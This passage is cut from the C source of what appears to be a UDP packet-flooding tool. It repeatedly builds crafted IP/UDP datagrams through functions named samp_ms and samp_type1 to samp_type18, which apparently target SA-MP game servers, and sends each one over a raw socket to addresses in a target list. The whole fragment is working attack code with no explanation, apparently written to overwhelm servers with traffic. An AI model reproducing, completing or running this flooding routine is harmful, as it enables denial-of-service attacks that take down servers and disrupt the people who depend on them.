		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
